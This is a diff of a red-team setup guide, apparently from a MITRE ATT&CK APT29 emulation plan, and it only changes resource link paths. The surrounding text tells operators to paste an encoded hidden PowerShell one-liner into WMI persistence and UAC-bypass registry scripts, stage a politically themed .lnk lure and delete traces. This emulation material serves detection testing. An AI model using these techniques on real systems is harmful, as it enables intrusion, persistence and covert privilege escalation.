@@ -19,15 +19,15 @@ We hope to capture the general structure of what is reported to have been seen b
 
 #### A note about red team payloads
 
-- Pre-compiled payloads are available in the [resources](/Resources) directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.
+- Pre-compiled payloads are available in the [resources](/apt29/Resources) directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.
 
 ### Generate an encoded PowerShell oneliner payload, then copy:
 
-1. Just the encoded portion (ex: `WwBTAH...=`) into `$enc_ps variable` (4th line from bottom) in [schemas.ps1](/Resources/Scenario_2/schemas.ps1)
+1. Just the encoded portion (ex: `WwBTAH...=`) into `$enc_ps variable` (4th line from bottom) in [schemas.ps1](/apt29/Resources/Scenario_2/schemas.ps1)
     - ex: `$enc_ps = "WwBTAH...=="`
-2. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `CommandLineTemplate` variable (under `$ConsumerArgs` in 2nd paragraph) in [stepFifteen_wmi.ps1](/Resources/Scenario_2/stepFifteen_wmi.ps1)
+2. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `CommandLineTemplate` variable (under `$ConsumerArgs` in 2nd paragraph) in [stepFifteen_wmi.ps1](/apt29/Resources/Scenario_2/stepFifteen_wmi.ps1)
     - ex: `CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`
-3. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `-Value` variable (2nd line) in [stepFourteen_bypassUAC.ps1](/Resources/Scenario_2/stepFourteen_bypassUAC.ps1)
+3. The entire value (ex: `powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=`) into `-Value` variable (2nd line) in [stepFourteen_bypassUAC.ps1](/apt29/Resources/Scenario_2/stepFourteen_bypassUAC.ps1)
     - ex: `New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="`
 
 #### Generate DLL payload, then on a separate Windows host:
@@ -48,11 +48,11 @@ We hope to capture the general structure of what is reported to have been seen b
 1. Login as non-domain admin user
 2. Copy over the following files onto the Desktop of the initial victim:
 
-   - [2016_United_States_presidential_election_-_Wikipedia.html](/Resources/Scenario_2/2016_United_States_presidential_election_-_Wikipedia.html)
-   - [make_lnk.ps1](/Resources/Scenario_2/make_lnk.ps1)
-   - [schemas.ps1](/Resources/Scenario_2/schemas.ps1)
+   - [2016_United_States_presidential_election_-_Wikipedia.html](/apt29/Resources/Scenario_2/2016_United_States_presidential_election_-_Wikipedia.html)
+   - [make_lnk.ps1](/apt29/Resources/Scenario_2/make_lnk.ps1)
+   - [schemas.ps1](/apt29/Resources/Scenario_2/schemas.ps1)
 
-3. Copy over [MITRE-ATTACK-EVALS.HTML](/Resources/Scenario_2/MITRE-ATTACK-EVALS.HTML) into the Documents folder of the initial victim
+3. Copy over [MITRE-ATTACK-EVALS.HTML](/apt29/Resources/Scenario_2/MITRE-ATTACK-EVALS.HTML) into the Documents folder of the initial victim
 4. Execute `make_lnk.ps1` (Right click > Run with PowerShell), this will generate `37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk`
 5. Drag `make_lnk.ps1` and `schemas.ps1` to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)
 
